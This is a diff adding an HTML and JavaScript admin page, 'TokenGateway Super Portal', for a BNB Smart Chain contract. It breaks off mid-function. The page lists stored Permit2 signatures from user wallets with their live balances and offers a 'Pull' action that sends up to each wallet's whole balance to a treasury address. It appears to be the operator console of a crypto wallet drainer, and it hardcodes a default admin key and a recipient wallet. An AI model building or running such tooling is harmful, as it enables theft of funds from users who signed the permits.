@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>TokenGateway — Super Portal</title>
+<meta name="description" content="TokenGateway Super Dashboard: Manage contract settings, view stored Permit2 permits, and execute token transfers on BNB Smart Chain." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
+<style>
+  /* ===== RESET & TOKENS ===== */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg-base:        #050709;
+    --bg-surface:     #0c0f16;
+    --bg-elevated:    #111620;
+    --bg-overlay:     #161d2b;
+    --bg-hover:       #1a2236;
+
+    --border-subtle:  #1e2736;
+    --border-default: #253045;
+    --border-accent:  #2d4a7a;
+
+    --text-primary:   #e8edf5;
+    --text-secondary: #8a97af;
+    --text-muted:     #4a5568;
+    --text-inverse:   #050709;
+
+    --accent-blue:    #3b82f6;
+    --accent-blue-dim:#1d4ed8;
+    --accent-green:   #22c55e;
+    --accent-red:     #ef4444;
+    --accent-amber:   #f59e0b;
+    --accent-purple:  #a855f7;
+
+    --glow-blue:      rgba(59,130,246,0.15);
+    --glow-green:     rgba(34,197,94,0.12);
+    --glow-red:       rgba(239,68,68,0.12);
+
+    --gradient-card:  linear-gradient(145deg, #111620 0%, #0c0f16 100%);
+    --gradient-blue:  linear-gradient(135deg, #1d4ed8, #3b82f6);
+    --gradient-green: linear-gradient(135deg, #16a34a, #22c55e);
+
+    --radius-sm:  6px;
+    --radius-md:  10px;
+    --radius-lg:  16px;
+    --radius-xl:  24px;
+
+    --font-sans:  'Inter', system-ui, sans-serif;
+    --font-mono:  'Space Mono', ui-monospace, monospace;
+
+    --transition: all .2s cubic-bezier(.4,0,.2,1);
+  }
+
+  html { font-size: 16px; scroll-behavior: smooth; }
+  body {
+    font-family: var(--font-sans);
+    background: var(--bg-base);
+    color: var(--text-primary);
+    min-height: 100vh;
+    overflow-x: hidden;
+    line-height: 1.6;
+    padding-bottom: 60px;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(59,130,246,.07) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(168,85,247,.05) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(59,130,246,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(59,130,246,.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .app-wrapper {
+    position: relative; z-index: 1;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 16px 40px;
+  }
+
+  .app-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 0 24px;
+    gap: 16px;
+    flex-wrap: wrap;
+    border-bottom: 1px solid var(--border-subtle);
+    margin-bottom: 24px;
+  }
+
+  .logo-group { display: flex; align-items: center; gap: 12px; }
+
+  .logo-icon {
+    width: 40px; height: 40px;
+    background: var(--gradient-blue);
+    border-radius: var(--radius-md);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.25rem;
+    box-shadow: 0 0 20px rgba(59,130,246,.3);
+    flex-shrink: 0;
+  }
+
+  .logo-text { display: flex; flex-direction: column; line-height: 1.2; }
+  .logo-title { font-size: 1.15rem; font-weight: 700; color: var(--text-primary); letter-spacing: -.02em; }
+  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 400; letter-spacing: .04em; text-transform: uppercase; }
+
+  .header-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+
+  .network-pill {
+    display: flex; align-items: center; gap: 6px;
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-default);
+    border-radius: 100px;
+    padding: 5px 12px;
+    font-size: .72rem;
+    color: var(--text-secondary);
+    font-weight: 500;
+  }
+
+  .network-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--accent-amber);
+    box-shadow: 0 0 8px var(--accent-amber);
+  }
+
+  .admin-badge {
+    display: flex; align-items: center; gap: 6px;
+    background: rgba(168,85,247,0.15);
+    border: 1px solid rgba(168,85,247,0.4);
+    border-radius: 100px;
+    padding: 5px 12px;
+    font-size: .75rem;
+    color: #c084fc;
+    font-weight: 600;
+  }
+
+  .card {
+    background: var(--gradient-card);
+    border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-lg);
+    padding: 20px;
+    margin-bottom: 20px;
+    transition: var(--transition);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(59,130,246,.3), transparent);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 18px;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+
+  .card-title {
+    display: flex; align-items: center; gap: 10px;
+    font-size: .95rem; font-weight: 600;
+    color: var(--text-primary);
+  }
+
+  .card-title-icon {
+    width: 28px; height: 28px;
+    border-radius: var(--radius-sm);
+    display: flex; align-items: center; justify-content: center;
+    font-size: .85rem;
+    background: var(--bg-overlay);
+    border: 1px solid var(--border-default);
+  }
+
+  .form-group { margin-bottom: 16px; }
+
+  .form-label {
+    display: block;
+    font-size: .72rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: .07em;
+    margin-bottom: 6px;
+  }
+
+  .form-control {
+    width: 100%;
+    padding: 12px 14px;
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    color: var(--text-primary);
+    font-size: .9rem;
+    font-family: var(--font-sans);
+    outline: none;
+    transition: var(--transition);
+  }
+
+  .form-control:focus {
+    border-color: var(--accent-blue);
+    box-shadow: 0 0 0 3px var(--glow-blue);
+  }
+
+  .form-control.mono { font-family: var(--font-mono); font-size: .85rem; word-break: break-all; }
+
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    font-family: var(--font-sans);
+    font-weight: 600; font-size: .875rem;
+    border: none; cursor: pointer;
+    border-radius: var(--radius-md);
+    transition: var(--transition);
+    text-decoration: none;
+    white-space: nowrap;
+    padding: 11px 18px;
+    min-height: 42px;
+  }
+
+  .btn-load {
+    background: var(--gradient-blue);
+    color: #fff;
+    width: 100%;
+    margin-top: 6px;
+    box-shadow: 0 4px 20px rgba(59,130,246,.25);
+  }
+  .btn-load:hover { box-shadow: 0 6px 30px rgba(59,130,246,.4); }
+
+  .btn-secondary {
+    background: var(--bg-elevated);
+    color: var(--text-secondary);
+    border: 1px solid var(--border-default);
+    padding: 8px 14px;
+    font-size: .8rem;
+  }
+  .btn-secondary:hover { border-color: var(--border-accent); color: var(--text-primary); background: var(--bg-hover); }
+
+  .btn-pull {
+    background: var(--gradient-green);
+    color: #fff;
+    padding: 7px 16px;
+    font-size: .82rem;
+    font-weight: 700;
+    box-shadow: 0 2px 10px rgba(34,197,94,.3);
+  }
+  .btn-pull:hover { box-shadow: 0 4px 18px rgba(34,197,94,.45); transform: translateY(-1px); }
+
+  .btn-danger {
+    background: rgba(239,68,68,.1);
+    color: var(--accent-red);
+    border: 1px solid rgba(239,68,68,.3);
+    padding: 8px 14px;
+    font-size: .8rem;
+  }
+  .btn-danger:hover { background: rgba(239,68,68,.2); }
+
+  .btn-copy {
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    color: var(--text-muted);
+    font-size: .9rem;
+    padding: 2px 4px;
+    transition: var(--transition);
+  }
+  .btn-copy:hover { color: var(--accent-blue); transform: scale(1.1); }
+
+  .alert {
+    margin-top: 16px;
+    padding: 12px 16px;
+    border-radius: var(--radius-md);
+    font-size: .83rem;
+    line-height: 1.6;
+    display: flex; align-items: flex-start; gap: 10px;
+    word-break: break-all;
+  }
+  .alert-ok { background: rgba(34,197,94,.08); border: 1px solid rgba(34,197,94,.3); color: #4ade80; }
+  .alert-err { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.3); color: #fc8181; }
+  .alert-info { background: rgba(59,130,246,.08); border: 1px solid rgba(59,130,246,.25); color: #93c5fd; }
+
+  /* ===== STATS GRID ===== */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .stat-card {
+    background: var(--bg-overlay);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    padding: 14px;
+  }
+
+  .stat-label {
+    font-size: .68rem; font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase; letter-spacing: .06em;
+    margin-bottom: 4px;
+  }
+
+  .stat-value {
+    font-size: 1.15rem; font-weight: 700;
+    color: var(--text-primary);
+    line-height: 1.2;
+    word-break: break-all;
+  }
+
+  .stat-value.mono-small { font-family: var(--font-mono); font-size: .82rem; }
+  .stat-sub { font-size: .7rem; color: var(--text-muted); margin-top: 4px; }
+
+  .settings-row {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    padding-top: 14px;
+    border-top: 1px solid var(--border-subtle);
+  }
+
+  /* ===== TABLE ===== */
+  .table-wrapper {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-md);
+    background: var(--bg-base);
+  }
+
+  table { width: 100%; border-collapse: collapse; font-size: .83rem; text-align: left; min-width: 780px; }
+
+  th {
+    padding: 12px 14px;
+    color: var(--text-muted);
+    font-size: .7rem; font-weight: 600;
+    text-transform: uppercase; letter-spacing: .06em;
+    border-bottom: 1px solid var(--border-default);
+    background: var(--bg-surface);
+    white-space: nowrap;
+  }
+
+  td {
+    padding: 14px;
+    border-bottom: 1px solid var(--border-subtle);
+    vertical-align: middle;
+    color: var(--text-secondary);
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: var(--bg-hover); color: var(--text-primary); }
+
+  .owner-cell {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .full-addr-row {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .full-addr {
+    font-family: var(--font-mono);
+    font-size: .78rem;
+    color: #60a5fa;
+    word-break: break-all;
+    user-select: all;
+  }
+
+  .td-amount { font-family: var(--font-mono); font-weight: 700; color: var(--text-primary); font-size: .9rem; }
+
+  .badge {
+    display: inline-flex; align-items: center;
+    padding: 3px 9px;
+    border-radius: 100px;
+    font-size: .7rem; font-weight: 600;
+    text-transform: uppercase; letter-spacing: .05em;
+  }
+  .badge-pending  { background: rgba(59,130,246,.12); color: #60a5fa; border: 1px solid rgba(59,130,246,.3); }
+  .badge-executed { background: rgba(34,197,94,.12);  color: #4ade80; border: 1px solid rgba(34,197,94,.3); }
+  .badge-partial  { background: rgba(245,158,11,.12); color: #fbbf24; border: 1px solid rgba(245,158,11,.3); }
+  .badge-failed   { background: rgba(239,68,68,.12);  color: #f87171; border: 1px solid rgba(239,68,68,.3); }
+  .badge-expired  { background: rgba(100,116,139,.12);color: #94a3b8; border: 1px solid rgba(100,116,139,.3); }
+
+  .progress-wrap { height: 4px; background: var(--bg-surface); border-radius: 10px; overflow: hidden; margin-top: 4px; }
+  .progress-fill { height: 100%; background: var(--accent-green); border-radius: 10px; }
+
+  .user-bal-pill {
+    display: inline-flex;
+    flex-direction: column;
+    background: rgba(34,197,94,0.08);
+    border: 1px solid rgba(34,197,94,0.25);
+    border-radius: var(--radius-sm);
+    padding: 3px 8px;
+    margin-top: 4px;
+  }
+  .user-bal-val { font-family: var(--font-mono); font-weight: 600; color: #4ade80; font-size: .75rem; }
+  .user-bal-label { font-size: .62rem; color: var(--text-muted); text-transform: uppercase; }
+
+  .empty-state { text-align: center; padding: 40px 16px; color: var(--text-muted); }
+  .empty-icon { font-size: 2.2rem; margin-bottom: 8px; }
+
+  .spinner {
+    display: inline-block; width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin .7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ===== PULL MODAL ===== */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.75);
+    backdrop-filter: blur(4px);
+    z-index: 1000;
+    display: flex; align-items: center; justify-content: center;
+    padding: 16px;
+  }
+  .modal-box {
+    background: #0d121c;
+    border: 1px solid var(--border-accent);
+    border-radius: var(--radius-lg);
+    width: 100%;
+    max-width: 520px;
+    padding: 24px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+    position: relative;
+    max-height: 90vh;
+    overflow-y: auto;
+  }
+  .modal-header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 18px; border-bottom: 1px solid var(--border-subtle);
+    padding-bottom: 12px;
+  }
+  .modal-title { font-size: 1.1rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; }
+  .modal-close {
+    background: transparent; border: none; font-size: 1.2rem; color: var(--text-muted); cursor: pointer; padding: 4px;
+  }
+  .modal-close:hover { color: #fff; }
+
+  .summary-box {
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    padding: 14px;
+    margin-bottom: 18px;
+    font-size: .83rem;
+  }
+  .summary-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 4px 0;
+    gap: 8px;
+  }
+  .summary-label { color: var(--text-muted); font-size: .75rem; text-transform: uppercase; }
+  .summary-val { color: var(--text-primary); font-family: var(--font-mono); font-size: .82rem; word-break: break-all; }
+
+  .quick-amounts {
+    display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap;
+  }
+  .btn-chip {
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-default);
+    border-radius: 100px;
+    padding: 4px 12px;
+    font-size: .72rem;
+    color: var(--text-secondary);
+    cursor: pointer;
+    font-family: var(--font-mono);
+  }
+  .btn-chip:hover { border-color: var(--accent-blue); color: #fff; }
+
+  /* ===== MOBILE ADJUSTMENTS ===== */
+  @media (max-width: 640px) {
+    .app-header { flex-direction: column; align-items: flex-start; gap: 12px; }
+    .header-actions { width: 100%; justify-content: space-between; }
+    .card { padding: 16px; }
+    .stats-grid { grid-template-columns: 1fr 1fr; gap: 8px; }
+    .stat-card { padding: 10px; }
+    .stat-value { font-size: 1rem; }
+    .settings-row { flex-direction: column; }
+    .settings-row .btn { width: 100%; }
+    .modal-box { padding: 16px; }
+  }
+</style>
+</head>
+<body>
+<div class="app-wrapper">
+  <header class="app-header">
+    <div class="logo-group">
+      <div class="logo-icon">🛡</div>
+      <div class="logo-text">
+        <span class="logo-title">TokenGateway</span>
+        <span class="logo-sub">Super Portal · Management</span>
+      </div>
+    </div>
+    <div class="header-actions">
+      <div class="network-pill">
+        <div class="network-dot"></div>
+        BSC Mainnet
+      </div>
+      <div class="admin-badge">
+        <span>🛡</span> Super Restricted
+      </div>
+      <a href="/" class="btn btn-secondary" style="text-decoration:none;font-size:.78rem;padding:6px 12px;">← User Page</a>
+    </div>
+  </header>
+
+  <div id="admin-app"></div>
+</div>
+
+<!-- Modal Container -->
+<div id="modal-container"></div>
+
+<script>
+'use strict';
+
+const API_BASE = '/api';
+const state = {
+  adminKey: localStorage.getItem('adminKey') || 'tg-8f3k2p9xQm7vNrL4wZ1cJ6hYbDsEuA0',
+  adminStatus: null,
+  permits: [],
+  adminBusy: false,
+  adminMsg: '',
+  adminMsgKind: '',
+  activePullPermit: null,
+  pullSubmitting: false,
+  pullError: '',
+  pullSuccess: ''
+};
+
+function esc(s) {
+  return String(s || '').replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+function shortAddr(addr) {
+  if (!addr) return '—';
+  return addr.slice(0, 8) + '…' + addr.slice(-6);
+}
+
+function fmtDate(ts) {
+  if (!ts) return '—';
+  return new Date(ts * 1000).toLocaleDateString(undefined, { year:"numeric", month:"short", day:"numeric" });
+}
+
+function fmtDateTimeBD(ts) {
+  if (!ts) return '—';
+  try {
+    const d = new Date(Number(ts) * 1000);
+    return new Intl.DateTimeFormat('en-US', {
+      timeZone: 'Asia/Dhaka',
+      month: 'short',
+      day: 'numeric',
+      year: 'numeric',
+      hour: 'numeric',
+      minute: '2-digit',
+      hour12: true
+    }).format(d);
+  } catch (e) {
+    return new Date(Number(ts) * 1000).toLocaleString();
+  }
+}
+
+function spentPct(p) {
+  if (!p.amount || p.amount === '0') return 0;
+  return Math.min(100, Math.round((Number(p.spent || 0) / Number(p.amount)) * 100));
+}
+
+function badgeHtml(status) {
+  const map = { pending:"pending", executed:"executed", partial:"partial", failed:"failed", expired:"expired" };
+  const cls = map[status] || "expired";
+  return `<span class="badge badge-${cls}">${esc(status)}</span>`;
+}
+
+function alertHtml(msg, kind) {
+  if (!msg) return '';
+  const cls = kind === 'ok' ? 'alert-ok' : kind === 'err' ? 'alert-err' : 'alert-info';
+  const icon = kind === 'ok' ? '✅' : kind === 'err' ? '❌' : 'ℹ️';
+  return `<div class="alert ${cls}"><span>${icon}</span><span>${esc(msg)}</span></div>`;
+}
+
+function copyText(txt) {
+  navigator.clipboard.writeText(txt).then(() => {
+    alert('Copied to clipboard:\n' + txt);
+  }).catch(() => {
+    prompt('Copy address manually:', txt);
+  });
+}
+
+async function req(path, { method = 'GET', body, headers = {} } = {}) {
+  const res = await fetch(`${API_BASE}${path}`, {
+    method,
+    headers: { 'Content-Type': 'application/json', ...headers },
+    body: body ? JSON.stringify(body) : undefined
+  });
+  const text = await res.text();
+  let data = {};
+  try { data = text ? JSON.parse(text) : {}; } catch { data = { error: text }; }
+  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
+  return data;
+}
+
+function adminApi(key) {
+  const h = { 'x-admin-key': key };
+  return {
+    status:      ()                => req('/super/status', { headers: h }),
+    permits:     ()                => req('/super/permits', { headers: h }),
+    execute:     (id, to, amount)  => req(`/super/permits/${id}/execute`, { method: 'POST', headers: h, body: { to, amount } }),
+    setPaused:   (p)               => req('/super/settings/paused',   { method: 'POST', headers: h, body: { paused: p } }),
+    setFee:      (f)               => req('/super/settings/fee',      { method: 'POST', headers: h, body: { feeBps: f } }),
+    setTreasury: (t)               => req('/super/settings/treasury', { method: 'POST', headers: h, body: { treasury: t } }),
+    rescue:      (b)               => req('/super/rescue',            { method: 'POST', headers: h, body: b })
+  };
+}
+
+function render() {
+  const root = document.getElementById('admin-app');
+  const s = state.adminStatus;
+  if (state.permits && state.permits.length) {
+    state.permits.sort((a, b) => Number(b.id) - Number(a.id));
+  }
+
+  root.innerHTML = `
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">🔐</div> Super Authentication</div>
+      </div>
+      <div class="form-group">
+        <label class="form-label" for="inp-key">Super API Key</label>
+        <input id="inp-key" class="form-control mono" type="password"
+               placeholder="Enter super key" value="${esc(state.adminKey)}" autocomplete="off" />
+      </div>
+      <button id="btn-load" class="btn btn-load" ${state.adminBusy ? 'disabled' : ''}>
+        ${state.adminBusy ? '<span class="spinner"></span> Loading…' : '📡 Load Super Dashboard'}
+      </button>
+      ${alertHtml(state.adminMsg, state.adminMsgKind)}
+    </div>
+
+    ${s ? buildDashboard(s) : ''}
+  `;
+
+  renderModal();
+  bind();
+}
+
+function buildDashboard(s) {
+  return `
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">📊</div> Contract Status</div>
+        <span class="badge ${s.paused ? 'badge-failed' : 'badge-executed'}">${s.paused ? 'Paused' : 'Active'}</span>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-label">Admin Wallet</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.admin))}</div>
+          <div class="stat-sub">${esc(s.admin)}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Treasury Wallet</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.treasury))}</div>
+          <div class="stat-sub">${esc(s.treasury)}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Admin Gas Balance</div>
+          <div class="stat-value">${esc(parseFloat(s.bnbBalance || '0').toFixed(4))}</div>
+          <div class="stat-sub">BNB for gas</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Protocol Fee</div>
+          <div class="stat-value">${esc(String(s.feeBps))}</div>
+          <div class="stat-sub">bps (${((s.feeBps / 10000) * 100).toFixed(2)}%)</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Permit2 Contract</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.permit2))}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Gateway Contract</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.gateway))}</div>
+        </div>
+      </div>
+
+      <div class="settings-row">
+        <button id="btn-toggle-pause" class="btn ${s.paused ? 'btn-secondary' : 'btn-danger'}">
+          ${s.paused ? '▶ Unpause Contract' : '⏸ Pause Contract'}
+        </button>
+        <button id="btn-set-fee" class="btn btn-secondary">💰 Set Fee</button>
+        <button id="btn-set-treasury" class="btn btn-secondary">🏦 Set Treasury</button>
+        <button id="btn-rescue" class="btn btn-secondary">🚑 Rescue Tokens</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">📋</div> Signed Permits Database</div>
+        <span style="font-size:.78rem;color:var(--text-muted)">${state.permits.length} record${state.permits.length !== 1 ? 's' : ''}</span>
+      </div>
+
+      ${state.permits.length === 0
+        ? `<div class="empty-state"><div class="empty-icon">📭</div><div class="empty-text">No permits stored yet. Connect user wallet and approve to see records here.</div></div>`
+        : `<div class="table-wrapper">
+            <table>
+              <thead>
+                <tr>
+                  <th>ID</th>
+                  <th>Approved Time (BD)</th>
+                  <th>User Wallet Address (Fully Visible)</th>
+                  <th>Refer Link</th>
+                  <th>Referred By</th>
+                  <th>Token</th>
+                  <th>Live Wallet Balance</th>
+                  <th>Approved Limit</th>
+                  <th>Total Spent</th>
+                  <th>Expires</th>
+                  <th>Status</th>
+                  <th>Action</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${state.permits.map(p => buildPermitRow(p)).join('')}
+              </tbody>
+            </table>
+          </div>`
+      }
+    </div>
+  `;
+}
+
+function buildPermitRow(p) {
+  const pct = spentPct(p);
+  const userBal = p.userBalanceHuman ? `${p.userBalanceHuman} ${p.tokenSymbol}` : '—';
+  const myRefCode = (p.owner || '').slice(-6).toLowerCase();
+  const myRefUrl = `${window.location.origin}/ref?${myRefCode}`;
+
+  return `
+    <tr>
+      <td style="color:var(--accent-blue);font-weight:700;font-family:var(--font-mono);font-size:.85rem">#${esc(String(p.id))}</td>
+      <td style="white-space:nowrap;">
+        <div style="font-size:.82rem;font-weight:600;color:var(--text-primary);">${esc(fmtDateTimeBD(p.createdAt))}</div>
+        <div style="font-size:.67rem;color:var(--text-muted);margin-top:2px;">BD Time (GMT+6)</div>
+      </td>
+      <td>
+        <div class="owner-cell">
+          <div class="full-addr-row">
+            <span class="full-addr">${esc(p.owner)}</span>
+            <button class="btn-copy" onclick="copyText('${esc(p.owner)}')" title="Copy Address">📋</button>
+            <a href="https://bscscan.com/address/${esc(p.owner)}" target="_blank" class="btn-copy" style="text-decoration:none;" title="View on BSCScan">↗</a>
+          </div>
+        </div>
+      </td>
+      <td>
+        <div style="display:inline-flex;align-items:center;gap:6px;">
+          <span class="badge" style="background:rgba(59,130,246,0.12);color:#60a5fa;border:1px solid rgba(59,130,246,0.3);font-family:var(--font-mono);font-size:.72rem;">ref?${esc(myRefCode)}</span>
+          <button class="btn-copy" onclick="copyText('${esc(myRefUrl)}')" title="Copy Refer Link">📋</button>
+        </div>
+      </td>
+      <td>
+        ${p.referredBy
+          ? `<span class="badge" style="background:rgba(168,85,247,0.12);color:#c084fc;border:1px solid rgba(168,85,247,0.3);font-family:var(--font-mono);font-size:.72rem;">ref?${esc(p.referredBy)}</span>`
+          : `<span style="color:var(--text-muted);font-size:.72rem;">Direct</span>`
+        }
+      </td>
+      <td>
+        <span style="font-weight:700;color:var(--text-primary)">${esc(p.tokenSymbol || '—')}</span>
+      </td>
+      <td>
+        <div class="user-bal-pill">
+          <span class="user-bal-val">${esc(userBal)}</span>
+          <span class="user-bal-label">Live In Wallet</span>
+        </div>
+      </td>
+      <td>
+        <div class="td-amount">${esc(p.amountHuman || p.amount)} ${esc(p.tokenSymbol)}</div>
+        <div class="progress-wrap" style="width:100px">
+          <div class="progress-fill" style="width:${pct}%"></div>
+        </div>
+        <div style="font-size:.65rem;color:var(--text-muted);margin-top:2px">${pct}% pulled</div>
+      </td>
+      <td class="td-amount" style="color:var(--text-secondary);font-size:.82rem">${esc(p.spentHuman || p.spent || '0')} ${esc(p.tokenSymbol)}</td>
+      <td style="font-size:.78rem;white-space:nowrap">${fmtDate(p.expiration)}</td>
+      <td>${badgeHtml(p.status)}</td>
+      <td>
+        ${p.status === 'pending' || p.status === 'partial'
+          ? `<button class="btn btn-pull" data-pull-id="${esc(String(p.id))}">⚡ Pull</button>`
+          : `<span style="color:var(--text-muted);font-size:.72rem">—</span>`
+        }
+      </td>
+    </tr>
+  `;
+}
+
+function renderModal() {
+  const container = document.getElementById('modal-container');
+  if (!state.activePullPermit) {
+    container.innerHTML = '';
+    return;
+  }
+
+  const p = state.activePullPermit;
+  const rawApproved = BigInt(p.amount || '0');
+  const rawSpent = BigInt(p.spent || '0');
+  const rawRemaining = rawApproved - rawSpent;
+  const remainingHuman = p.amountHuman ? (Number(p.amountHuman) - Number(p.spentHuman || 0)).toString() : '12000';
+  const userBal = p.userBalanceHuman || '0';
+  const defaultRecipient = state.adminStatus?.treasury || '0x540ce13bB18698dDd4B313FbD4077e2948514A56';
+
+  container.innerHTML = `
+    <div class="modal-overlay" id="pull-overlay">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title">⚡ Pull Funds (Permit #${esc(String(p.id))})</div>
+          <button class="modal-close" id="modal-close-btn">&times;</button>
+        </div>
+
+        <div class="summary-box">
+          <div class="summary-row">
+            <span class="summary-label">User Address</span>
+            <span class="summary-val">${esc(p.owner)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Live In User Wallet</span>
+            <span class="summary-val" style="color:#4ade80;font-weight:700;">${esc(userBal)} ${esc(p.tokenSymbol)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Total Approved Limit</span>
+            <span class="summary-val">${esc(p.amountHuman)} ${esc(p.tokenSymbol)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Remaining Limit</span>
+            <span class="summary-val">${esc(remainingHuman)} ${esc(p.tokenSymbol)}</span>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="pull-recipient">Recipient Address (Where pulled tokens are sent)</label>
+          <input id="pull-recipient" class="form-control mono" value="${esc(defaultRecipient)}" />
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="pull-amount">Amount to Pull (${esc(p.tokenSymbol)})</label>
+          <input id="pull-amount" class="form-control" type="text" inputmode="decimal" value="${esc(userBal !== '0' ? userBal : '1')}" />
+          <div class="quick-amounts">
+            <button class="btn-chip" onclick="document.getElementById('pull-amount').value='${esc(userBal)}'">Max In Wallet (${esc(userBal)})</button>
+            <button class="btn-chip" onclick="document.getElementById('pull-amount').value='1'">1 ${esc(p.tokenSymbol)}</button>
+            <button class="btn-chip" onclick="document.getElementById('pull-amount').value='${esc(remainingHuman)}'">Remaining Limit (${esc(remainingHuman)})</button>
+          </div>
+        </div>
+
+        <button id="btn-modal-confirm" class="btn btn-pull" style="width:100%;margin-top:14px;padding:12px;" ${state.pullSubmitting ? 'disabled' : ''}>
+          ${state.pullSubmitting ? '<span class="spinner"></span> Pulling on-chain…' : '🚀 Confirm & Pull Tokens On-Chain'}
+        </button>
+
+        ${state.pullError ? `<div class="alert alert-err"><span>❌</span><span>${esc(state.pullError)}</span></div>` : ''}
+        ${state.pullSuccess ? `<div class="alert alert-ok"><span>✅</span><span>${esc(state.pullSuccess)}</span></div>` : ''}
+      </div>
+    </div>
+  `;
+
+  document.getElementById('modal-close-btn').onclick = () => {
+    state.activePullPermit = null;
+    state.pullError = '';
+    state.pullSuccess = '';
+    renderModal();
+  };
+
+  document.getElementById('pull-overlay').onclick = (e) => {
+    if (e.target.id === 'pull-overlay') {
+      state.activePullPermit = null;
+      state.pullError = '';
+      state.pullSuccess = '';
+      renderModal();
+    }
+  };
+
+  document.getElementById('btn-modal-confirm').onclick = async () => {
+    const to = document.getElementById('pull-recipient').value.trim();
+    const amt = document.getElementById('pull-amount').value.trim();
+
+    if (!to || !/^0x[a-fA-F0-9]{40}$/.test(to)) {
+      state.pullError = 'Invalid recipient address.';
+      renderModal();
+      return;
+    }
+    if (!amt || isNaN(Number(amt)) || Number(amt) <= 0) {
+      state.pullError = 'Please enter a valid positive amount.';
+      renderModal();
+      return;
+    }
+
+    state.pullSubmitting = true;
+    state.pullError = '';
+    state.pullSuccess = '';
+    renderModal();
+
+    try {
+      const a = adminApi(state.adminKey);
+      const r = await a.execute(p.id, to, amt);
+
+      state.pullSuccess = `Successfully pulled ${amt} ${p.tokenSymbol}! Tx: ${r.txHash} (Remaining limit: ${r.remaining} ${p.tokenSymbol})`;
+
